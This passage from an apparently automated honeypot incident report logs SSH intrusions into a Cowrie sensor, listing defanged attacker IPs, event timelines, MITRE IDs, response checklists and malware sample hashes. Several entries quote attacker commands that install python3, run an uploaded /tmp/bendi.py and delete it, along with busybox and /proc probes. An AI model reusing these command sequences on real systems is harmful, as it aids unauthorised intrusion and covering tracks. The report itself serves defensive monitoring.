| `2026-07-10 16:32:13` | `cowrie.login.success` |
| `2026-07-10 16:32:13` | `cowrie.direct-tcpip.request` |
| `2026-07-10 16:32:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.233[.]110` to AbuseIPDB if not already reported
- [ ] Block `65.20.233[.]110` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b2916f3a9ffc

| Field | Detail |
|---|---|
| **Source IP** | `45.181.101[.]95` |
| **First Seen** | 2026-07-10 16:32 |
| **Last Seen** | 2026-07-10 16:32 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 16:32:18` | `cowrie.session.connect` |
| `2026-07-10 16:32:19` | `cowrie.client.version` |
| `2026-07-10 16:32:19` | `cowrie.client.kex` |
| `2026-07-10 16:32:20` | `cowrie.login.success` |
| `2026-07-10 16:32:21` | `cowrie.direct-tcpip.request` |
| `2026-07-10 16:32:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.181.101[.]95` to AbuseIPDB if not already reported
- [ ] Block `45.181.101[.]95` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f1920a9c399b

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-10 16:32 |
| **Last Seen** | 2026-07-10 16:32 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 16:32:38` | `cowrie.session.connect` |
| `2026-07-10 16:32:38` | `cowrie.client.version` |
| `2026-07-10 16:32:38` | `cowrie.client.kex` |
| `2026-07-10 16:32:39` | `cowrie.login.success` |
| `2026-07-10 16:32:40` | `cowrie.session.params` |
| `2026-07-10 16:32:40` | `cowrie.command.input` |
| `2026-07-10 16:32:42` | `cowrie.log.closed` |
| `2026-07-10 16:32:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2ea4f3e2b128

| Field | Detail |
|---|---|
| **Source IP** | `62.140.234[.]114` |
| **First Seen** | 2026-07-10 16:33 |
| **Last Seen** | 2026-07-10 16:34 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 16:33:54` | `cowrie.session.connect` |
| `2026-07-10 16:33:54` | `cowrie.client.version` |
| `2026-07-10 16:33:54` | `cowrie.client.kex` |
| `2026-07-10 16:33:55` | `cowrie.login.success` |
| `2026-07-10 16:33:56` | `cowrie.direct-tcpip.request` |
| `2026-07-10 16:34:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `62.140.234[.]114` to AbuseIPDB if not already reported
- [ ] Block `62.140.234[.]114` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4437610129e8

| Field | Detail |
|---|---|
| **Source IP** | `93.4.16[.]74` |
| **First Seen** | 2026-07-10 16:34 |
| **Last Seen** | 2026-07-10 16:34 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 16:34:01` | `cowrie.session.connect` |
| `2026-07-10 16:34:02` | `cowrie.client.version` |
| `2026-07-10 16:34:02` | `cowrie.client.kex` |
| `2026-07-10 16:34:03` | `cowrie.login.success` |
| `2026-07-10 16:34:03` | `cowrie.direct-tcpip.request` |
| `2026-07-10 16:34:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `93.4.16[.]74` to AbuseIPDB if not already reported
- [ ] Block `93.4.16[.]74` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-296b988f00c2

| Field | Detail |
|---|---|
| **Source IP** | `113.140.95[.]2` |
| **First Seen** | 2026-07-10 16:37 |
| **Last Seen** | 2026-07-10 16:37 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 16:37:26` | `cowrie.session.connect` |
| `2026-07-10 16:37:27` | `cowrie.client.version` |
| `2026-07-10 16:37:27` | `cowrie.client.kex` |
| `2026-07-10 16:37:28` | `cowrie.login.success` |
| `2026-07-10 16:37:29` | `cowrie.direct-tcpip.request` |
| `2026-07-10 16:37:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `113.140.95[.]2` to AbuseIPDB if not already reported
- [ ] Block `113.140.95[.]2` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9a7df02e7d37

| Field | Detail |
|---|---|
| **Source IP** | `165.1.75[.]106` |
| **First Seen** | 2026-07-10 16:37 |
| **Last Seen** | 2026-07-10 16:37 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 16:37:35` | `cowrie.session.connect` |
| `2026-07-10 16:37:35` | `cowrie.client.version` |
| `2026-07-10 16:37:35` | `cowrie.client.kex` |
| `2026-07-10 16:37:35` | `cowrie.login.success` |
| `2026-07-10 16:37:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.1.75[.]106` to AbuseIPDB if not already reported
- [ ] Block `165.1.75[.]106` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-af7a640e63ee

| Field | Detail |
|---|---|
| **Source IP** | `165.1.75[.]106` |
| **First Seen** | 2026-07-10 16:37 |
| **Last Seen** | 2026-07-10 16:37 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 16:37:35` | `cowrie.session.connect` |
| `2026-07-10 16:37:35` | `cowrie.client.version` |
| `2026-07-10 16:37:35` | `cowrie.client.kex` |
| `2026-07-10 16:37:35` | `cowrie.login.success` |
| `2026-07-10 16:37:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.1.75[.]106` to AbuseIPDB if not already reported
- [ ] Block `165.1.75[.]106` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-234f2f8b8b8d

| Field | Detail |
|---|---|
| **Source IP** | `165.1.75[.]106` |
| **First Seen** | 2026-07-10 16:37 |
| **Last Seen** | 2026-07-10 16:39 |
| **Session Duration** | 126s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `command -v python3 >/dev/null 2>&1 || (apt-get update -y && apt-get install -y python3) || yum install -y python3, apt-get update -y, apt-get install -y python3, python3 /tmp/bendi.py, rm /tmp/bendi.py` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 16:37:52` | `cowrie.session.connect` |
| `2026-07-10 16:37:52` | `cowrie.client.version` |
| `2026-07-10 16:37:52` | `cowrie.client.kex` |
| `2026-07-10 16:37:52` | `cowrie.login.success` |
| `2026-07-10 16:37:53` | `cowrie.session.file_upload` |
| `2026-07-10 16:37:54` | `cowrie.session.params` |
| `2026-07-10 16:37:54` | `cowrie.command.input` |
| `2026-07-10 16:37:54` | `cowrie.command.input` |
| `2026-07-10 16:37:54` | `cowrie.command.input` |
| `2026-07-10 16:37:54` | `cowrie.command.failed` |
| `2026-07-10 16:37:54` | `cowrie.log.closed` |
| `2026-07-10 16:37:55` | `cowrie.session.params` |
| `2026-07-10 16:37:55` | `cowrie.command.input` |
| `2026-07-10 16:37:55` | `cowrie.log.closed` |
| `2026-07-10 16:37:55` | `cowrie.session.params` |
| `2026-07-10 16:37:55` | `cowrie.command.input` |
| `2026-07-10 16:37:56` | `cowrie.log.closed` |
| `2026-07-10 16:37:56` | `cowrie.session.params` |
| `2026-07-10 16:37:56` | `cowrie.command.input` |
| `2026-07-10 16:37:56` | `cowrie.command.failed` |
| `2026-07-10 16:37:56` | `cowrie.command.failed` |
| `2026-07-10 16:38:57` | `cowrie.session.params` |
| `2026-07-10 16:38:57` | `cowrie.command.input` |
| `2026-07-10 16:39:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.1.75[.]106` to AbuseIPDB if not already reported
- [ ] Block `165.1.75[.]106` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-09d4dfae3dd6

| Field | Detail |
|---|---|
| **Source IP** | `178.178.222[.]58` |
| **First Seen** | 2026-07-10 16:39 |
| **Last Seen** | 2026-07-10 16:39 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 16:39:46` | `cowrie.session.connect` |
| `2026-07-10 16:39:47` | `cowrie.client.version` |
| `2026-07-10 16:39:47` | `cowrie.client.kex` |
| `2026-07-10 16:39:48` | `cowrie.login.success` |
| `2026-07-10 16:39:49` | `cowrie.direct-tcpip.request` |
| `2026-07-10 16:39:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.178.222[.]58` to AbuseIPDB if not already reported
- [ ] Block `178.178.222[.]58` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d53f2dac8e05

| Field | Detail |
|---|---|
| **Source IP** | `47.77.216[.]159` |
| **First Seen** | 2026-07-10 16:39 |
| **Last Seen** | 2026-07-10 16:40 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 16:39:56` | `cowrie.session.connect` |
| `2026-07-10 16:39:56` | `cowrie.telnet.option` |
| `2026-07-10 16:39:56` | `cowrie.telnet.option` |
| `2026-07-10 16:40:56` | `cowrie.login.success` |
| `2026-07-10 16:40:57` | `cowrie.session.params` |

**Recommended Actions:**
- [ ] Submit `47.77.216[.]159` to AbuseIPDB if not already reported
- [ ] Block `47.77.216[.]159` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-db7b2f4aa736

| Field | Detail |
|---|---|
| **Source IP** | `165.1.75[.]106` |
| **First Seen** | 2026-07-10 16:40 |
| **Last Seen** | 2026-07-10 16:42 |
| **Session Duration** | 126s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `command -v python3 >/dev/null 2>&1 || (apt-get update -y && apt-get install -y python3) || yum install -y python3, apt-get update -y, apt-get install -y python3, python3 /tmp/bendi.py, rm /tmp/bendi.py` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 16:40:13` | `cowrie.session.connect` |
| `2026-07-10 16:40:13` | `cowrie.client.version` |
| `2026-07-10 16:40:13` | `cowrie.client.kex` |
| `2026-07-10 16:40:13` | `cowrie.login.success` |
| `2026-07-10 16:40:14` | `cowrie.session.file_upload` |
| `2026-07-10 16:40:15` | `cowrie.session.params` |
| `2026-07-10 16:40:15` | `cowrie.command.input` |
| `2026-07-10 16:40:15` | `cowrie.command.input` |
| `2026-07-10 16:40:15` | `cowrie.command.input` |
| `2026-07-10 16:40:15` | `cowrie.command.failed` |
| `2026-07-10 16:40:15` | `cowrie.log.closed` |
| `2026-07-10 16:40:16` | `cowrie.session.params` |
| `2026-07-10 16:40:16` | `cowrie.command.input` |
| `2026-07-10 16:40:16` | `cowrie.log.closed` |
| `2026-07-10 16:40:16` | `cowrie.session.params` |
| `2026-07-10 16:40:16` | `cowrie.command.input` |
| `2026-07-10 16:40:16` | `cowrie.log.closed` |
| `2026-07-10 16:40:17` | `cowrie.session.params` |
| `2026-07-10 16:40:17` | `cowrie.command.input` |
| `2026-07-10 16:40:17` | `cowrie.command.failed` |
| `2026-07-10 16:40:17` | `cowrie.command.failed` |
| `2026-07-10 16:41:18` | `cowrie.session.params` |
| `2026-07-10 16:41:18` | `cowrie.command.input` |
| `2026-07-10 16:42:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.1.75[.]106` to AbuseIPDB if not already reported
- [ ] Block `165.1.75[.]106` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2e5269fed050

| Field | Detail |
|---|---|
| **Source IP** | `200.105.141[.]172` |
| **First Seen** | 2026-07-10 16:41 |
| **Last Seen** | 2026-07-10 16:41 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 16:41:02` | `cowrie.session.connect` |
| `2026-07-10 16:41:03` | `cowrie.client.version` |
| `2026-07-10 16:41:03` | `cowrie.client.kex` |
| `2026-07-10 16:41:05` | `cowrie.login.success` |
| `2026-07-10 16:41:05` | `cowrie.direct-tcpip.request` |
| `2026-07-10 16:41:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `200.105.141[.]172` to AbuseIPDB if not already reported
- [ ] Block `200.105.141[.]172` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4ab47bfc1342

| Field | Detail |
|---|---|
| **Source IP** | `41.224.62[.]206` |
| **First Seen** | 2026-07-10 16:41 |
| **Last Seen** | 2026-07-10 16:41 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 16:41:10` | `cowrie.session.connect` |
| `2026-07-10 16:41:11` | `cowrie.client.version` |
| `2026-07-10 16:41:11` | `cowrie.client.kex` |
| `2026-07-10 16:41:12` | `cowrie.login.success` |
| `2026-07-10 16:41:12` | `cowrie.direct-tcpip.request` |
| `2026-07-10 16:41:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.224.62[.]206` to AbuseIPDB if not already reported
- [ ] Block `41.224.62[.]206` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8bce7dd9cd7f

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-10 16:41 |
| **Last Seen** | 2026-07-10 16:41 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 16:41:17` | `cowrie.session.connect` |
| `2026-07-10 16:41:18` | `cowrie.client.version` |
| `2026-07-10 16:41:18` | `cowrie.client.kex` |
| `2026-07-10 16:41:26` | `cowrie.login.success` |
| `2026-07-10 16:41:30` | `cowrie.session.params` |
| `2026-07-10 16:41:30` | `cowrie.command.input` |
| `2026-07-10 16:41:32` | `cowrie.log.closed` |
| `2026-07-10 16:41:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3c84972b56bc

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-10 16:50 |
| **Last Seen** | 2026-07-10 16:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 16:50:44` | `cowrie.session.connect` |
| `2026-07-10 16:50:44` | `cowrie.client.version` |
| `2026-07-10 16:50:44` | `cowrie.client.kex` |
| `2026-07-10 16:50:45` | `cowrie.login.success` |
| `2026-07-10 16:50:45` | `cowrie.session.params` |
| `2026-07-10 16:50:45` | `cowrie.command.input` |
| `2026-07-10 16:50:45` | `cowrie.log.closed` |
| `2026-07-10 16:50:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d75ecafee75c

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]41` |
| **First Seen** | 2026-07-10 16:53 |
| **Last Seen** | 2026-07-10 16:54 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST, /bin/busybox TEST, cat /proc, ./` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 16:53:58` | `cowrie.session.connect` |
| `2026-07-10 16:53:58` | `cowrie.login.success` |
| `2026-07-10 16:53:59` | `cowrie.session.params` |
| `2026-07-10 16:53:59` | `cowrie.command.input` |
| `2026-07-10 16:54:00` | `cowrie.command.input` |
| `2026-07-10 16:54:01` | `cowrie.command.input` |
| `2026-07-10 16:54:01` | `cowrie.command.input` |
| `2026-07-10 16:54:01` | `cowrie.command.failed` |
| `2026-07-10 16:54:02` | `cowrie.log.closed` |
| `2026-07-10 16:54:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]41` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]41` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `107.150.146[.]69` | **257** | 2026-07-10 12:57 | 2026-07-10 16:54 | 144m | 0 | `T1592` | 🟠 MEDIUM |
| `179.61.192[.]156` | **85** | 2026-07-10 13:00 | 2026-07-10 16:52 | 91m | 0 | `T1592` | 🟠 MEDIUM |
| `104.143.10[.]174` | **50** | 2026-07-10 13:01 | 2026-07-10 16:54 | 23m | 0 | `T1592` | 🟠 MEDIUM |
| `72.167.53[.]56` | **22** | 2026-07-10 14:24 | 2026-07-10 16:37 | 11m | 0 | `T1592` | 🟠 MEDIUM |
| `139.199.80[.]137` | **10** | 2026-07-10 12:57 | 2026-07-10 16:54 | 0m | 0 | `T1592` | 🟠 MEDIUM |
| `52.142.44[.]95` | **5** | 2026-07-10 13:36 | 2026-07-10 16:28 | 3m | 0 | `T1592` | 🟢 LOW |
| `66.132.224[.]91` | **5** | 2026-07-10 15:53 | 2026-07-10 15:54 | 0m | 0 | `T1592` | 🟢 LOW |
| `67.220.180[.]114` | **4** | 2026-07-10 13:08 | 2026-07-10 16:41 | 2m | 0 | `T1592` | 🟢 LOW |
| `104.194.10[.]143` | **3** | 2026-07-10 13:35 | 2026-07-10 13:42 | 0m | 2 | `T1110.001` | 🟢 LOW |
| `172.235.40[.]131` | **3** | 2026-07-10 15:36 | 2026-07-10 15:36 | 0m | 0 | `T1592` | 🟢 LOW |
| `172.236.228[.]208` | **3** | 2026-07-10 13:34 | 2026-07-10 13:34 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]133` | **3** | 2026-07-10 15:53 | 2026-07-10 15:54 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]135` | **3** | 2026-07-10 15:54 | 2026-07-10 15:55 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]204` | **3** | 2026-07-10 15:56 | 2026-07-10 15:57 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.186[.]170` | **3** | 2026-07-10 15:54 | 2026-07-10 15:55 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.186[.]185` | **3** | 2026-07-10 15:55 | 2026-07-10 15:56 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]118` | **3** | 2026-07-10 16:24 | 2026-07-10 16:25 | 0m | 0 | `T1592` | 🟢 LOW |
| `172.236.228[.]202` | **2** | 2026-07-10 13:08 | 2026-07-10 13:08 | 0m | 0 | `T1592` | 🟢 LOW |
| `101.126.17[.]72` | 1 | 2026-07-10 14:38 | 2026-07-10 14:40 | 120s | 0 | `T1592` | 🟢 LOW |
| `106.12.38[.]73` | 1 | 2026-07-10 13:35 | 2026-07-10 13:35 | 0s | 0 | `T1592` | 🟢 LOW |
| `112.51.27[.]82` | 1 | 2026-07-10 15:58 | 2026-07-10 16:00 | 120s | 0 | `T1592` | 🟢 LOW |
| `115.191.66[.]84` | 1 | 2026-07-10 14:29 | 2026-07-10 14:31 | 120s | 0 | `T1592` | 🟢 LOW |
| `117.158.160[.]42` | 1 | 2026-07-10 16:12 | 2026-07-10 16:12 | 0s | 0 | `T1592` | 🟢 LOW |
| `121.136.93[.]86` | 1 | 2026-07-10 16:11 | 2026-07-10 16:12 | 13s | 0 | `T1592` | 🟢 LOW |
| `174.64.199[.]85` | 1 | 2026-07-10 16:47 | 2026-07-10 16:49 | 120s | 0 | `T1592` | 🟢 LOW |
| `182.53.52[.]68` | 1 | 2026-07-10 16:06 | 2026-07-10 16:06 | 1s | 0 | `T1592` | 🟢 LOW |
| `183.171.11[.]79` | 1 | 2026-07-10 16:37 | 2026-07-10 16:39 | 120s | 0 | `T1592` | 🟢 LOW |
| `183.222.14[.]9` | 1 | 2026-07-10 16:09 | 2026-07-10 16:11 | 120s | 0 | `T1592` | 🟢 LOW |
| `183.94.33[.]245` | 1 | 2026-07-10 16:18 | 2026-07-10 16:20 | 120s | 0 | `T1592` | 🟢 LOW |
| `187.49.63[.]41` | 1 | 2026-07-10 14:07 | 2026-07-10 14:07 | 6s | 0 | `T1592` | 🟢 LOW |
| `195.178.110[.]232` | 1 | 2026-07-10 16:35 | 2026-07-10 16:35 | 0s | 0 | `T1592` | 🟢 LOW |
| `196.188.93[.]169` | 1 | 2026-07-10 14:36 | 2026-07-10 14:38 | 113s | 0 | `T1592` | 🟢 LOW |
| `2.58.172[.]185` | 1 | 2026-07-10 16:08 | 2026-07-10 16:08 | 0s | 0 | `T1592` | 🟢 LOW |
| `203.129.225[.]4` | 1 | 2026-07-10 13:15 | 2026-07-10 13:15 | 2s | 0 | `T1592` | 🟢 LOW |
| `220.178.39[.]106` | 1 | 2026-07-10 15:43 | 2026-07-10 15:45 | 120s | 0 | `T1592` | 🟢 LOW |
| `221.159.21[.]170` | 1 | 2026-07-10 13:58 | 2026-07-10 14:00 | 120s | 0 | `T1592` | 🟢 LOW |
| `223.84.239[.]151` | 1 | 2026-07-10 14:50 | 2026-07-10 14:52 | 120s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]151` | 1 | 2026-07-10 16:02 | 2026-07-10 16:02 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.198.224[.]120` | 1 | 2026-07-10 13:34 | 2026-07-10 13:34 | 6s | 0 | `T1592` | 🟢 LOW |
| `45.33.109[.]18` | 1 | 2026-07-10 14:35 | 2026-07-10 14:35 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.79.207[.]71` | 1 | 2026-07-10 13:33 | 2026-07-10 13:33 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.79.8[.]221` | 1 | 2026-07-10 15:35 | 2026-07-10 15:35 | 2s | 0 | `T1592` | 🟢 LOW |
| `49.124.152[.]213` | 1 | 2026-07-10 13:40 | 2026-07-10 13:40 | 0s | 0 | `T1592` | 🟢 LOW |
| `52.170.194[.]23` | 1 | 2026-07-10 16:28 | 2026-07-10 16:28 | 3s | 0 | `T1592` | 🟢 LOW |
| `60.166.31[.]198` | 1 | 2026-07-10 13:41 | 2026-07-10 13:43 | 120s | 0 | `T1592` | 🟢 LOW |
| `66.132.224[.]87` | 1 | 2026-07-10 15:48 | 2026-07-10 15:48 | 16s | 0 | `T1592` | 🟢 LOW |
| `85.217.149[.]11` | 1 | 2026-07-10 16:31 | 2026-07-10 16:31 | 0s | 0 | `T1592` | 🟢 LOW |
| `85.217.149[.]56` | 1 | 2026-07-10 16:48 | 2026-07-10 16:48 | 0s | 0 | `T1592` | 🟢 LOW |
| `94.154.43[.]41` | 1 | 2026-07-10 16:53 | 2026-07-10 16:53 | 0s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 57/100 | 🟡 MEDIUM | **18/74** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/73** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 68/100 | 🟡 MEDIUM | **21/74** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
